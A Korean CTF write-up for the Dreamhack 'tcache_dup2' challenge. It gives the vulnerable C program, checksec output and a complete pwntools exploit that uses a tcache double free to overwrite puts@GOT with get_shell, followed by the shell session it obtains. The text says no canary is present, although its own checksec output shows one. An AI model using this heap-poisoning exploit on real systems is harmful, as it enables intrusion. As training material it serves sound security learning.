# tcache_dup2

- [문제 페이지](https://dreamhack.io/wargame/challenges/67)

## 문제 해설
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}

```
문제 코드를 보면 힙 할당과 해제를 하는 코드임을 알 수 있다. 먼저 checksec을 살펴보자

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
PIE와 카나리가 존재하지 않는다. 

코드 시나리오를 작성해보면

1. Double Free Bug를 일으킨다.
2. GOT를 get_shell로 변조한다.

프리된 청크의 key를 변조하는 modify함수가 보인다.

따라서 이를 이용해 double free를 일으키고, fd를 puts의 got로 설정하여 이 data를 get_shell의 주소로 변조하면 된다.

이걸 python 코드로 작성하면

```python
from pwn import *

def create(size, data):
    global p

    p.sendlineafter(b"> ", b'1')

    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def modify(index, size, data):
    global p

    p.sendlineafter(b"> ", b'2')

    p.sendlineafter(b"idx: ", index)
    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def delete(index):
    global p

    p.sendlineafter(b"> ", b'3')

    p.sendlineafter(b"idx: ", index)
    
p = remote("host1.dreamhack.games", 20623)
# p = process("./tcache_dup2")
e = ELF("./tcache_dup2")

get_shell_address = e.symbols['get_shell']
puts_got = e.got["puts"];

create(b'16', b'test')
create(b'16', b'test')
delete(b'0')
delete(b'1')

modify(b'1', b'16', b'B'*8 + b'\x00'*4)
delete(b'1')

create(b'16', p64(puts_got))
create(b'16', b'c'*8)
create(b'16', p64(get_shell_address))

p.interactive()
```

다음과 같이 작성되고, 이를 실행하면
```
[*] Switching to interactive mode
$ ls
flag
tcache_dup2
$ cat flag
DH{************************************************************************************}
```
잘 실행됨을 확인할 수 있다.

![success](image.png)